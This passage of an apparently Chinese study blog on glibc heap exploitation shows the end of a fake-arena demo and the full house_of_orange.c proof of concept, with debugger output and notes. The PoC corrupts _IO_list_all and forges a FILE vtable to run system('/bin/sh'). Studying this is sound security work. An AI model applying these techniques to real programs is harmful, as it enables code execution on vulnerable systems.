	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"set, it will cause our fake 'heap_info' struct to be used.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This will dereference our fake arena location and write\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the address of the heap to an offset of the arena pointer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Trigger the magic by freeing the chunk!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>fastbin_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Trigger the madness</span>

	<span class="token comment">// For this particular fastbin chunk size, the offset is 0x28. </span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Target Write at %p: 0x%llx\n"</span><span class="token punctuation">,</span> target_loc<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>target_loc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>target_loc<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>断点至主循环前，查看栈中保存的信息：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220528212024228.png"></p>
<pre class="language-c" data-language="c"><code class="language-c">pwndbg<span class="token operator">></span> stack <span class="token number">30</span>
<span class="token number">00</span><span class="token operator">:</span><span class="token number">0000</span>│ rsp <span class="token number">0x7fffffffdf40</span> —▸ <span class="token number">0x7ffff7ffe168</span> —▸ <span class="token number">0x555555554000</span> ◂— <span class="token number">0x10102464c457f</span>
<span class="token number">01</span><span class="token operator">:</span><span class="token number">0008</span>│     <span class="token number">0x7fffffffdf48</span> ◂— <span class="token number">0x1ff0004000000</span>   <span class="token comment">//MAX_SIZE | HEAP_MAX_SIZE</span>
<span class="token number">02</span><span class="token operator">:</span><span class="token number">0010</span>│     <span class="token number">0x7fffffffdf50</span> —▸ <span class="token number">0x55555555c430</span> ◂— <span class="token number">0x0</span>   <span class="token comment">//user_mem</span>
<span class="token number">03</span><span class="token operator">:</span><span class="token number">0018</span>│     <span class="token number">0x7fffffffdf58</span> —▸ <span class="token number">0x55555555b420</span> ◂— <span class="token number">0x0</span>   <span class="token comment">//fake_arena</span>
<span class="token number">04</span><span class="token operator">:</span><span class="token number">0020</span>│     <span class="token number">0x7fffffffdf60</span> —▸ <span class="token number">0x55555555b448</span> ◂— <span class="token number">0x0</span>   <span class="token comment">//target_loc</span>
<span class="token number">05</span><span class="token operator">:</span><span class="token number">0028</span>│     <span class="token number">0x7fffffffdf68</span> —▸ <span class="token number">0x55555555b410</span> ◂— <span class="token number">0x0</span>   <span class="token comment">//target_chunk</span>
<span class="token number">06</span><span class="token operator">:</span><span class="token number">0030</span>│     <span class="token number">0x7fffffffdf70</span> ◂— <span class="token number">0x555558000000</span>          <span class="token comment">//new_arena_value</span>
<span class="token number">07</span><span class="token operator">:</span><span class="token number">0038</span>│     <span class="token number">0x7fffffffdf78</span> ◂— <span class="token number">0x555558000000</span>          <span class="token comment">//fake_heap_info</span>
<span class="token number">08</span><span class="token operator">:</span><span class="token number">0040</span>│     <span class="token number">0x7fffffffdf80</span> —▸ <span class="token number">0x7fffffffe070</span> ◂— <span class="token number">0x1</span>
<span class="token number">09</span><span class="token operator">:</span><span class="token number">0048</span>│     <span class="token number">0x7fffffffdf88</span> ◂— <span class="token number">0x0</span>
<span class="token number">0</span>a<span class="token operator">:</span><span class="token number">0050</span>│ rbp <span class="token number">0x7fffffffdf90</span> —▸ <span class="token number">0x555555555480</span> ◂— endbr64 </code></pre>

<p>进入while后循环申请0x1FF00大小的chunk，直到分配的chunk的地址大于new_arena_value</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220617164512343.png"></p>
<p>申请0x50的chunk</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220617164829293.png"></p>
<p>为fake_heap_info赋值</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220530123206444.png"></p>
<p>最终实现：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220617195641573.png"></p>
<p>由于fastbin_chunk的size被赋值为0x64不符合chunk规则&#x3D;&#x3D;》将被定义为non-main arena&#x3D;&#x3D;》此处可由off by one实现</p>
<h4 id="总结：-2"><a href="#总结：-2" class="headerlink" title="总结："></a>总结：</h4><p>该程序利用了_heap_info结构体：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_heap_info</span>
<span class="token punctuation">&#123;</span>
  mstate ar_ptr<span class="token punctuation">;</span>           <span class="token comment">// Arena for this heap. &lt;--- Malloc State pointer</span>
  <span class="token keyword">struct</span> <span class="token class-name">_heap_info</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span> <span class="token comment">// Previous heap.</span>
  <span class="token class-name">size_t</span> size<span class="token punctuation">;</span>            <span class="token comment">// Current size in bytes.</span>
  <span class="token class-name">size_t</span> mprotect_size<span class="token punctuation">;</span>   <span class="token comment">// Size in bytes that has been mprotected</span>
  <span class="token keyword">char</span> pad<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span> <span class="token operator">*</span> SIZE_SZ <span class="token operator">&amp;</span> MALLOC_ALIGN_MASK<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// Proper alignment</span>
<span class="token punctuation">&#125;</span> heap_info<span class="token punctuation">;</span> </code></pre>

<p>该结构体的第一个元素ar_ptr可以指定malloc_state</p>
<p>&#x3D;&#x3D;&#x3D;》</p>
<p><strong>攻击思路</strong>：</p>
<p>寻找一个fake_arena地址作为non_main arena的地址</p>
<p>分配足够的chunk到达non_main arena地址</p>
<p>创造fake_heap_info指明at_ptr&#x3D;&#x3D;&gt;fake_arena</p>
<p>利用该fake_arena，fastbin向本ar_ptr不期望写入的地址写入</p>
<p><strong>思考：</strong>arena如何被找到;</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">heap_for_ptr</span><span class="token expression"><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span>heap_info <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>HEAP_MAX_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">arena_for_chunk</span><span class="token expression"><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
  <span class="token expression"><span class="token punctuation">(</span><span class="token function">chunk_non_main_arena</span> <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">heap_for_ptr</span> <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token operator">-></span>ar_ptr <span class="token operator">:</span> <span class="token operator">&amp;</span>main_arena<span class="token punctuation">)</span></span></span></code></pre>

<p>&#x3D;&#x3D;&gt;</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token class-name">uint64_t</span> new_arena_value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span> target_chunk<span class="token punctuation">)</span> <span class="token operator">+</span> HEAP_MAX_SIZE<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token operator">~</span><span class="token punctuation">(</span>HEAP_MAX_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>





<h3 id="house-of-orange-c"><a href="#house-of-orange-c" class="headerlink" title="house_of_orange.c"></a>house_of_orange.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_GNU_SOURCE</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/syscall.h></span></span>

<span class="token comment">/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/</span>

<span class="token comment">/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/</span>
<span class="token keyword">int</span> <span class="token function">winner</span> <span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token comment">/*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */</span>

    <span class="token keyword">char</span> <span class="token operator">*</span>p1<span class="token punctuation">,</span> <span class="token operator">*</span>p2<span class="token punctuation">;</span>
    <span class="token class-name">size_t</span> io_list_all<span class="token punctuation">,</span> <span class="token operator">*</span>top<span class="token punctuation">;</span>

    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The attack vector of this technique was removed by changing the behavior of malloc_printerr, "</span>
        <span class="token string">"which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
    <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"</span>
        <span class="token string">"https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*
      Firstly, lets allocate a chunk on the heap.
    */</span>

    p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x400</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.

       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.

       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.

       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk's prev_inuse bit has to be set.

       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */</span>

    top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> p1 <span class="token operator">+</span> <span class="token number">0x400</span> <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    top<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0xc01</span><span class="token punctuation">;</span>

    <span class="token comment">/* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.

       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.

       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.

       After the size of the Top chunk has been updated, this chunk gets freed.

       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */</span>

    p2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end

      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins


      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)

      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.

      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.

      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */</span>

    io_list_all <span class="token operator">=</span> top<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x9a8</span><span class="token punctuation">;</span>

    <span class="token comment">/*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.

      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be _IO_list_all - 16
    */</span>
 
    top<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> io_list_all <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">;</span>

    <span class="token comment">/*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */</span>

    <span class="token function">memcpy</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> top<span class="token punctuation">,</span> <span class="token string">"/bin/sh\x00"</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      Since we overflow the old top chunk, we also control it's size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size &lt;= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */</span>

    top<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0x61</span><span class="token punctuation">;</span>

    <span class="token comment">/*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      We want to satisfy the first condition:
      fp->_mode &lt;= 0 &amp;&amp; fp->_IO_write_ptr > fp->_IO_write_base
    */</span>

    FILE <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token punctuation">(</span>FILE <span class="token operator">*</span><span class="token punctuation">)</span> top<span class="token punctuation">;</span>


    <span class="token comment">/*
      1. Set mode to 0: fp->_mode &lt;= 0
    */</span>

    fp<span class="token operator">-></span>_mode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// top+0xc0</span>


    <span class="token comment">/*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */</span>

    fp<span class="token operator">-></span>_IO_write_base <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// top+0x20</span>
    fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">// top+0x28</span>


    <span class="token comment">/*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */</span>

    <span class="token class-name">size_t</span> <span class="token operator">*</span>jump_table <span class="token operator">=</span> <span class="token operator">&amp;</span>top<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// controlled memory</span>
    jump_table<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>winner<span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> fp <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>FILE<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> jump_table<span class="token punctuation">;</span> <span class="token comment">// top+0xd8</span>


    <span class="token comment">/* Finally, trigger the whole chain by calling malloc */</span>
    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token comment">/*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>ptr<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span> 
    <span class="token function">system</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_exit<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请0x400-16的chunk p1：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220618145310678.png"></p>
<p>将top chunk的size修改：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220618145415039.png"></p>
<p>申请超过top chunk的chunk p2：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token comment">/*
Otherwise, relay to handle system-dependent cases
*/</span>
<span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">sysmalloc</span><span class="token punctuation">(</span>nb<span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>perturb_byte<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> p<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>执行sysmalloc申请&#x3D;&#x3D;》原有的top chunk置于unsorted bin中</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220618150037054.png"></p>
<p><strong>重点：</strong></p>
<p>在glibc2.23中，当程序异常中止时，会通过调用_IO_flush_all_lockp实现将所有文件指针清空，最后遍历_IO_list_all并调用_IO_OVERFLOW函数&#x3D;&#x3D;》</p>
<p><strong>攻击思路：</strong>构造fake _IO_all_list&#x3D;&#x3D;&gt;使_IO_OVERFLOW指向system函数</p>
<p>&#x3D;&#x3D;》_IO_OVERFLOW(fp,EOF)变成system(‘&#x2F;bin&#x2F;sh’)&#x3D;&#x3D;》</p>
<p>_IO_list_all的地址通过unsorted bin的fd和bk获得&#x3D;&#x3D;》当unsorted bin中仅有一个chunk时，fd和bk都指向main_arena+0x88&#x3D;&#x3D;》而_IO_list_all在之后<strong>0x9A8</strong>处（<strong>glibc2.23</strong>）</p>
<p>最后需要将**&#x2F;bin&#x2F;sh放入开头8字节**</p>
<p>程序将本来在unsorted bin中的chunk size修改为0x61</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220619221931702.png"></p>
<p>将chunk地址看成是一个假的_IO_FILE结构体指针fp</p>
<p>fp-&gt;mode设为0 		top+0xc0</p>
<p>fp-&gt;_IO_write_base设为2			top+0x20</p>
<p>fp-&gt;_IO_write_ptr设为3				top+0x28</p>
<p><strong>结构体定义：</strong></p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span>
<span class="token punctuation">&#123;</span>
  _IO_FILE file<span class="token punctuation">;</span>
  <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span> <span class="token operator">*</span>vtable<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">extern</span> <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE_plus</span> <span class="token operator">*</span>IO_list_all<span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> _flags<span class="token punctuation">;</span>		<span class="token comment">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">_IO_file_flags</span> <span class="token expression">_flags</span></span>

  <span class="token comment">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="token comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_ptr<span class="token punctuation">;</span>	<span class="token comment">/* Current read pointer */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_end<span class="token punctuation">;</span>	<span class="token comment">/* End of get area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_read_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of putback+get area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of put area. */</span>      <span class="token comment">/////0x20</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_ptr<span class="token punctuation">;</span>	<span class="token comment">/* Current put pointer. */</span>				<span class="token comment">/////0x28</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_write_end<span class="token punctuation">;</span>	<span class="token comment">/* End of put area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_base<span class="token punctuation">;</span>	<span class="token comment">/* Start of reserve area. */</span>
  <span class="token keyword">char</span><span class="token operator">*</span> _IO_buf_end<span class="token punctuation">;</span>	<span class="token comment">/* End of reserve area. */</span>
  <span class="token comment">/* The following fields are used to support backing up and undo. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_base<span class="token punctuation">;</span> <span class="token comment">/* Pointer to start of non-current get area. */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_backup_base<span class="token punctuation">;</span>  <span class="token comment">/* Pointer to first valid character of backup area */</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>_IO_save_end<span class="token punctuation">;</span> <span class="token comment">/* Pointer to end of non-current get area. */</span>

  <span class="token keyword">struct</span> <span class="token class-name">_IO_marker</span> <span class="token operator">*</span>_markers<span class="token punctuation">;</span>

  <span class="token keyword">struct</span> <span class="token class-name">_IO_FILE</span> <span class="token operator">*</span>_chain<span class="token punctuation">;</span>	<span class="token comment">// 这个是进程FILE的指针域，通过这个指针链接形成链表，表头为_IO_list_all</span>

  <span class="token keyword">int</span> _fileno<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression"><span class="token number">0</span></span></span>
  <span class="token keyword">int</span> _blksize<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>
  <span class="token keyword">int</span> _flags2<span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
  _IO_off_t _old_offset<span class="token punctuation">;</span> <span class="token comment">/* This used to be _offset but it's too small.  */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">__HAVE_COLUMN</span> <span class="token comment">/* temporary */</span></span>
  <span class="token comment">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">short</span> _cur_column<span class="token punctuation">;</span>
  <span class="token keyword">signed</span> <span class="token keyword">char</span> _vtable_offset<span class="token punctuation">;</span>
